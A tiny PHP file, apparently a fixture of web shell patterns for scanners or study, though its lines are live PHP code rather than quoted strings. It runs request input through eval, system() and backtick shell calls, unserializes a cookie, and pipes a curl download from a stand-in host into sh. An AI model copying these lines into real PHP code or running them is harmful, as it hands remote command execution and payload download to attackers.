<?php
// Classic web shell shapes, inert: nothing here is ever run.
eval(base64_decode($_POST['p']));
system($_GET['cmd']);
$out = `ls {$_GET['dir']}`;
$data = unserialize($_COOKIE['state']);
shell_exec("curl -fsSL https://example.invalid/x | sh");
